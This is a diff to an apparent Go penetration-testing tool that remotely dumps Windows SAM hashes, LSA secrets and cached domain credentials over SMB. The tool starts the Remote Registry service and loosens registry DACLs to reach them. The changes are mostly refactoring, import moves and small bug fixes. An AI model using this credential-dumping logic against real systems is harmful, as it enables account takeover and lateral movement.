@@ -40,18 +40,19 @@ import (
 	"golang.org/x/net/proxy"
 	"golang.org/x/term"
 
+	"github.com/jfjallid/go-smb/dcerpc"
+	"github.com/jfjallid/go-smb/dcerpc/msrrp"
+	"github.com/jfjallid/go-smb/dcerpc/msscmr"
+	"github.com/jfjallid/go-smb/dcerpc/smbtransport"
 	"github.com/jfjallid/go-smb/msdtyp"
 	"github.com/jfjallid/go-smb/smb"
-	"github.com/jfjallid/go-smb/smb/dcerpc"
-	"github.com/jfjallid/go-smb/smb/dcerpc/msrrp"
-	"github.com/jfjallid/go-smb/smb/dcerpc/msscmr"
 	"github.com/jfjallid/go-smb/smb/encoder"
 	"github.com/jfjallid/go-smb/spnego"
 	"github.com/jfjallid/golog"
 )
 
 var log = golog.Get("")
-var release string = "0.5.2"
+var release string = "0.6.0"
 
 var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
 
@@ -62,7 +63,7 @@ var administratorsSID string = "S-1-5-32-544"
 var registryKeysModified []string
 
 // Map with all original security descriptors
-var m map[string]*msdtyp.SecurityDescriptor
+var originalDacls map[string]*msdtyp.SecurityDescriptor
 
 var samSecretList = []printableSecret{}
 var lsaSecretList = []printableSecret{}
@@ -75,44 +76,40 @@ type printableSecret interface {
 	printSecret(io.Writer)
 }
 
-type sam_account struct {
+type samAccount struct {
 	name   string
 	rid    uint32
 	nthash string
 }
 
-func (self *sam_account) printSecret(out io.Writer) {
+func (s *samAccount) printSecret(out io.Writer) {
 	if outputFile != nil {
-		fmt.Fprintf(out, "%s:%d:%s\n", self.name, self.rid, self.nthash)
+		fmt.Fprintf(out, "%s:%d:%s\n", s.name, s.rid, s.nthash)
 	} else {
-		fmt.Fprintf(out, "Name: %s\n", self.name)
-		fmt.Fprintf(out, "RID: %d\n", self.rid)
-		fmt.Fprintf(out, "NT: %s\n\n", self.nthash)
+		fmt.Fprintf(out, "Name: %s\n", s.name)
+		fmt.Fprintf(out, "RID: %d\n", s.rid)
+		fmt.Fprintf(out, "NT: %s\n\n", s.nthash)
 	}
 }
 
-type dcc2_cache struct {
+type dcc2Cache struct {
 	domain string
 	user   string
 	cache  string
 }
 
-func (self *dcc2_cache) printSecret(out io.Writer) {
-	fmt.Fprintln(out, self.cache)
+func (d *dcc2Cache) printSecret(out io.Writer) {
+	fmt.Fprintln(out, d.cache)
 }
 
-func (self *printableLSASecret) printSecret(out io.Writer) {
-	fmt.Fprintln(out, self.secretType)
-	for _, item := range self.secrets {
+func (s *printableLSASecret) printSecret(out io.Writer) {
+	fmt.Fprintln(out, s.secretType)
+	for _, item := range s.secrets {
 		fmt.Fprintln(out, item)
 	}
-	if self.extraSecret != "" {
-		fmt.Fprintln(out, self.extraSecret)
+	if s.extraSecret != "" {
+		fmt.Fprintln(out, s.extraSecret)
 	}
-}
-
-func init() {
-	rand.Seed(time.Now().UnixNano())
 }
 
 func getRandString(n int) string {
@@ -140,8 +137,12 @@ func startRemoteRegistry(session *smb.Connection, share string) (started, disabl
 		return
 	}
 	defer f.CloseFile()
+	transport, err := smbtransport.NewSMBTransport(f)
+	if err != nil {
+		log.Errorf("Failed to create SMB transport: %v\n", err)
+	}
 
-	bind, err := dcerpc.Bind(f, msscmr.MSRPCUuidSvcCtl, msscmr.MSRPCSvcCtlMajorVersion, msscmr.MSRPCSvcCtlMinorVersion, dcerpc.MSRPCUuidNdr)
+	bind, err := dcerpc.Bind(transport, msscmr.MSRPCUuidSvcCtl, msscmr.MSRPCSvcCtlMajorVersion, msscmr.MSRPCSvcCtlMinorVersion, dcerpc.MSRPCUuidNdr)
 	if err != nil {
 		log.Errorln("Failed to bind to service")
 		log.Errorln(err)
@@ -155,35 +156,34 @@ func startRemoteRegistry(session *smb.Connection, share string) (started, disabl
 	if err != nil {
 		log.Errorln(err)
 		return
-	} else {
-		if status == msscmr.ServiceRunning {
-			started = true
-			disabled = false
-			return
-		}
-		// Check if disabled
-		config, err := rpccon.GetServiceConfig(serviceName)
-		if err != nil {
-			log.Errorf("Failed to get config of %s service with error: %v\n", serviceName, err)
-			return started, disabled, err
-		}
-		if config.StartType == msscmr.StartTypeStatusMap[msscmr.ServiceDisabled] {
-			disabled = true
-			// Enable service
-			err = rpccon.ChangeServiceConfig(serviceName, msscmr.ServiceNoChange, msscmr.ServiceDemandStart, msscmr.ServiceNoChange, "", "", "", "", "", "", 0)
-			if err != nil {
-				log.Errorf("Failed to change service config from Disabled to Start on Demand with error: %v\n", err)
-				return started, disabled, err
-			}
-		}
-		// Start service
-		err = rpccon.StartService(serviceName, nil)
-		if err != nil {
-			log.Errorln(err)
-			return started, disabled, err
-		}
-		time.Sleep(time.Second)
 	}
+	if status == msscmr.ServiceRunning {
+		started = true
+		disabled = false
+		return
+	}
+	// Check if disabled
+	config, err := rpccon.GetServiceConfig(serviceName)
+	if err != nil {
+		log.Errorf("Failed to get config of %s service with error: %v\n", serviceName, err)
+		return started, disabled, err
+	}
+	if config.StartType == msscmr.StartTypeStatusMap[msscmr.ServiceDisabled] {
+		disabled = true
+		// Enable service
+		err = rpccon.ChangeServiceConfig(serviceName, msscmr.ServiceNoChange, msscmr.ServiceDemandStart, msscmr.ServiceNoChange, "", "", "", "", "", "", 0)
+		if err != nil {
+			log.Errorf("Failed to change service config from Disabled to Start on Demand with error: %v\n", err)
+			return started, disabled, err
+		}
+	}
+	// Start service
+	err = rpccon.StartService(serviceName, nil)
+	if err != nil {
+		log.Errorln(err)
+		return started, disabled, err
+	}
+	time.Sleep(time.Second)
 	return
 }
 
@@ -196,7 +196,12 @@ func stopRemoteRegistry(session *smb.Connection, share string, disable bool) (er
 	}
 	defer f.CloseFile()
 
-	bind, err := dcerpc.Bind(f, msscmr.MSRPCUuidSvcCtl, msscmr.MSRPCSvcCtlMajorVersion, msscmr.MSRPCSvcCtlMinorVersion, dcerpc.MSRPCUuidNdr)
+	transport, err := smbtransport.NewSMBTransport(f)
+	if err != nil {
+		log.Errorf("Failed to create SMB transport: %v\n", err)
+	}
+
+	bind, err := dcerpc.Bind(transport, msscmr.MSRPCUuidSvcCtl, msscmr.MSRPCSvcCtlMajorVersion, msscmr.MSRPCSvcCtlMinorVersion, dcerpc.MSRPCUuidNdr)
 	if err != nil {
 		log.Errorln("Failed to bind to service")
 		log.Errorln(err)
@@ -227,8 +232,8 @@ func stopRemoteRegistry(session *smb.Connection, share string, disable bool) (er
 }
 
 func changeDacl(rpccon *msrrp.RPCCon, base []byte, keys []string, sid string) error {
-	if m == nil {
-		m = make(map[string]*msdtyp.SecurityDescriptor)
+	if originalDacls == nil {
+		originalDacls = make(map[string]*msdtyp.SecurityDescriptor)
 	}
 
 	for _, subkey := range keys {
@@ -267,8 +272,8 @@ func changeDacl(rpccon *msrrp.RPCCon, base []byte, keys []string, sid string) er
 		}
 		// Check if key exists before adding to map.
 		// Don't want to replace an existing key in case I change the ACL twice
-		if _, ok := m[subkey]; !ok {
-			m[subkey] = sd
+		if _, ok := originalDacls[subkey]; !ok {
+			originalDacls[subkey] = sd
 			if daclBackupFile != nil {
 				// Save new SD file
 				sdBytes, err := encoder.Marshal(sd)
@@ -289,7 +294,7 @@ func changeDacl(rpccon *msrrp.RPCCon, base []byte, keys []string, sid string) er
 		ace, err := msrrp.NewAce(sid, mask, msdtyp.AccessAllowedAceType, msdtyp.ContainerInheritAce)
 		if err != nil {
 			rpccon.CloseKeyHandle(hSubKey)
-			delete(m, subkey)
+			delete(originalDacls, subkey)
 			log.Errorln(err)
 			return err
 		}
@@ -300,7 +305,7 @@ func changeDacl(rpccon *msrrp.RPCCon, base []byte, keys []string, sid string) er
 		err = rpccon.SetKeySecurity(hSubKey, newSd)
 		if err != nil {
 			rpccon.CloseKeyHandle(hSubKey)
-			delete(m, subkey)
+			delete(originalDacls, subkey)
 			log.Errorln(err)
 			return err
 		}
@@ -310,8 +315,8 @@ func changeDacl(rpccon *msrrp.RPCCon, base []byte, keys []string, sid string) er
 }
 
 func revertDacl(rpccon *msrrp.RPCCon, base []byte, keys []string) error {
-	if m == nil {
-		err := fmt.Errorf("The map variable 'm' is not initialized which would indicate that no DACL was changed yet")
+	if originalDacls == nil {
+		err := fmt.Errorf("originalDacls map is not initialized, which indicates no DACL was changed yet")
 		log.Errorln(err)
 		return err
 	}
@@ -319,14 +324,14 @@ func revertDacl(rpccon *msrrp.RPCCon, base []byte, keys []string) error {
 	var sd *msdtyp.SecurityDescriptor
 	var ok bool
 	for _, subkey := range keys {
-		if sd, ok = m[subkey]; !ok {
+		if sd, ok = originalDacls[subkey]; !ok {
 			log.Debugf("Trying to restore DACL of registry key %s, but the original DACL hasn't been saved.\nIt is likely that the registry key doesn't even exist\n", subkey)
 			// Key did not exist so was not added to map
 			continue
 		}
 		hSubKey, err := rpccon.OpenSubKey(base, subkey)
 		if err != nil {
-			log.Errorf("Tried to restore DACL of registry key %s, but failed to open registry key with error: %s\n", err)
+			log.Errorf("Tried to restore DACL of registry key %s, but failed to open registry key with error: %s\n", subkey, err)
 			continue // Try to change as many keys as possible
 		}
 
@@ -391,7 +396,7 @@ func restoreDaclFromBackup(rpccon *msrrp.RPCCon, hKey []byte) error {
 		return err
 	}
 
-	m = daclMap
+	originalDacls = daclMap
 
 	return tryRollbackChanges(rpccon, hKey, keys)
 }
@@ -413,7 +418,7 @@ func tryRollbackChanges(rpccon *msrrp.RPCCon, hKey []byte, keys []string) error 
 	return nil
 }
 
-func addToListIfNotExit(list *[]string, keys []string) []string {
+func addToListIfNotExist(list *[]string, keys []string) []string {
 	newKeys := []string{}
 OuterLoop:
 	for _, key := range keys {
@@ -492,7 +497,7 @@ func dumpSAM(rpccon *msrrp.RPCCon, hKey []byte, modifyDacl bool) (err error) {
 		//TODO Rewrite handling of creds to not print to stdout until the end
 		// Would be nice to be able to choose writing output to file, or somewhere else
 		for _, cred := range creds {
-			acc := sam_account{name: cred.Username, rid: cred.RID}
+			acc := samAccount{name: cred.Username, rid: cred.RID}
 			//fmt.Printf("Name: %s\n", cred.Username)
 			//fmt.Printf("RID: %d\n", cred.RID)
 			if len(cred.Data) == 0 {
@@ -556,7 +561,7 @@ func dumpLSASecrets(rpccon *msrrp.RPCCon, hKey []byte, modifyDacl bool) (err err
 			newSecrets = append(newSecrets, fmt.Sprintf("%s\\%s\\%s", keySecrets, secrets[i], "CurrVal"))
 		}
 
-		newKeys := addToListIfNotExit(&registryKeysModified, newSecrets)
+		newKeys := addToListIfNotExist(&registryKeysModified, newSecrets)
 		err = changeDacl(rpccon, hKey, newKeys, administratorsSID)
 		if err != nil {
 			log.Errorln(err)
@@ -601,7 +606,7 @@ func dumpDCC2Cache(rpccon *msrrp.RPCCon, hKey []byte, modifyDacl bool) error {
 	}
 
 	if modifyDacl {
-		newKeys := addToListIfNotExit(&registryKeysModified, keys)
+		newKeys := addToListIfNotExist(&registryKeysModified, keys)
 		// Grant temporarily higher permissions to the local administrators group
 		err := changeDacl(rpccon, hKey, newKeys, administratorsSID)
 		if err != nil {
@@ -619,7 +624,7 @@ func dumpDCC2Cache(rpccon *msrrp.RPCCon, hKey []byte, modifyDacl bool) error {
 	for _, hash := range cachedHashes {
 		userdomain := strings.Split(hash, ":")[0]
 		parts := strings.Split(userdomain, "/")
-		dcc2SecretList = append(dcc2SecretList, &dcc2_cache{domain: parts[0], user: parts[1], cache: hash})
+		dcc2SecretList = append(dcc2SecretList, &dcc2Cache{domain: parts[0], user: parts[1], cache: hash})
 	}
 
 	//if len(cachedHashes) > 0 {
@@ -627,7 +632,7 @@ func dumpDCC2Cache(rpccon *msrrp.RPCCon, hKey []byte, modifyDacl bool) error {
 	//	for _, secret := range cachedHashes {
 	//        userdomain := strings.Split(secret, ":")[0]
 	//        parts := strings.Split(userdomain, "/")
-	//        _ = dcc2_cache{
+	//        _ = dcc2Cache{
 	//            domain: parts[0],
 	//            user: parts[1],
 	//            cache: secret,
@@ -849,9 +854,9 @@ func main() {
 		golog.Set("github.com/jfjallid/go-smb/smb", "smb", golog.LevelDebug, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
 		golog.Set("github.com/jfjallid/go-smb/spnego", "spnego", golog.LevelDebug, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
 		golog.Set("github.com/jfjallid/go-smb/gss", "gss", golog.LevelDebug, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
-		golog.Set("github.com/jfjallid/go-smb/smb/dcerpc", "dcerpc", golog.LevelDebug, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
-		golog.Set("github.com/jfjallid/go-smb/smb/dcerpc/msrrp", "msrrp", golog.LevelDebug, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
-		golog.Set("github.com/jfjallid/go-smb/smb/dcerpc/msscmr", "msscmr", golog.LevelDebug, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
+		golog.Set("github.com/jfjallid/go-smb/dcerpc", "dcerpc", golog.LevelDebug, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
+		golog.Set("github.com/jfjallid/go-smb/dcerpc/msrrp", "msrrp", golog.LevelDebug, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
+		golog.Set("github.com/jfjallid/go-smb/dcerpc/msscmr", "msscmr", golog.LevelDebug, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
 		golog.Set("github.com/jfjallid/go-smb/krb5ssp", "krb5ssp", golog.LevelDebug, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
 		log.SetFlags(golog.LstdFlags | golog.Lshortfile)
 		log.SetLogLevel(golog.LevelDebug)
@@ -859,9 +864,9 @@ func main() {
 		golog.Set("github.com/jfjallid/go-smb/smb", "smb", golog.LevelInfo, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
 		golog.Set("github.com/jfjallid/go-smb/spnego", "spnego", golog.LevelInfo, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
 		golog.Set("github.com/jfjallid/go-smb/gss", "gss", golog.LevelInfo, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
-		golog.Set("github.com/jfjallid/go-smb/smb/dcerpc", "dcerpc", golog.LevelInfo, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
-		golog.Set("github.com/jfjallid/go-smb/smb/dcerpc/msrrp", "msrrp", golog.LevelInfo, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
-		golog.Set("github.com/jfjallid/go-smb/smb/dcerpc/msscmr", "msscmr", golog.LevelInfo, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
+		golog.Set("github.com/jfjallid/go-smb/dcerpc", "dcerpc", golog.LevelInfo, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
+		golog.Set("github.com/jfjallid/go-smb/dcerpc/msrrp", "msrrp", golog.LevelInfo, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
+		golog.Set("github.com/jfjallid/go-smb/dcerpc/msscmr", "msscmr", golog.LevelInfo, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
 		golog.Set("github.com/jfjallid/go-smb/krb5ssp", "krb5ssp", golog.LevelInfo, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
 		log.SetFlags(golog.LstdFlags | golog.Lshortfile)
 		log.SetLogLevel(golog.LevelInfo)
@@ -869,9 +874,9 @@ func main() {
 		golog.Set("github.com/jfjallid/go-smb/smb", "smb", golog.LevelNotice, golog.LstdFlags, golog.DefaultOutput, golog.DefaultErrOutput)
 		golog.Set("github.com/jfjallid/go-smb/spnego", "spnego", golog.LevelNotice, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
 		golog.Set("github.com/jfjallid/go-smb/gss", "gss", golog.LevelNotice, golog.LstdFlags, golog.DefaultOutput, golog.DefaultErrOutput)
-		golog.Set("github.com/jfjallid/go-smb/smb/dcerpc", "dcerpc", golog.LevelNotice, golog.LstdFlags, golog.DefaultOutput, golog.DefaultErrOutput)
-		golog.Set("github.com/jfjallid/go-smb/smb/dcerpc/msrrp", "msrrp", golog.LevelNotice, golog.LstdFlags, golog.DefaultOutput, golog.DefaultErrOutput)
-		golog.Set("github.com/jfjallid/go-smb/smb/dcerpc/msscmr", "msscmr", golog.LevelNotice, golog.LstdFlags, golog.DefaultOutput, golog.DefaultErrOutput)
+		golog.Set("github.com/jfjallid/go-smb/dcerpc", "dcerpc", golog.LevelNotice, golog.LstdFlags, golog.DefaultOutput, golog.DefaultErrOutput)
+		golog.Set("github.com/jfjallid/go-smb/dcerpc/msrrp", "msrrp", golog.LevelNotice, golog.LstdFlags, golog.DefaultOutput, golog.DefaultErrOutput)
+		golog.Set("github.com/jfjallid/go-smb/dcerpc/msscmr", "msscmr", golog.LevelNotice, golog.LstdFlags, golog.DefaultOutput, golog.DefaultErrOutput)
 		golog.Set("github.com/jfjallid/go-smb/krb5ssp", "krb5ssp", golog.LevelNotice, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
 	}
 
@@ -1008,6 +1013,7 @@ func main() {
 	if aesKey != "" && !kerberos {
 		fmt.Println("Must use Kerberos auth (-k) when using --aes-key")
 		flag.Usage()
+		return
 	}
 
 	if noPass {
@@ -1068,7 +1074,7 @@ func main() {
 			AESKey:      aesKeyBytes,
 			SPN:         "cifs/" + host,
 			DCIP:        dcIP,
-			DialTimout:  dialTimeout,
+			DialTimeout: dialTimeout,
 			ProxyDialer: smbOptions.ProxyDialer,
 			DnsHost:     dnsHost,
 			DnsTCP:      dnsTCP,
@@ -1154,8 +1160,12 @@ func main() {
 	}
 	defer f.CloseFile()
 
+	transport, err := smbtransport.NewSMBTransport(f)
+	if err != nil {
+		log.Errorf("Failed to create SMB transport: %v\n", err)
+	}
 	// Bind to Windows Remote Registry service
-	bind, err := dcerpc.Bind(f, msrrp.MSRRPUuid, msrrp.MSRRPMajorVersion, msrrp.MSRRPMinorVersion, msrrp.NDRUuid)
+	bind, err := dcerpc.Bind(transport, msrrp.MSRRPUuid, msrrp.MSRRPMajorVersion, msrrp.MSRRPMinorVersion, msrrp.NDRUuid)
 	if err != nil {
 		log.Errorln("Failed to bind to service")
 		log.Errorln(err)
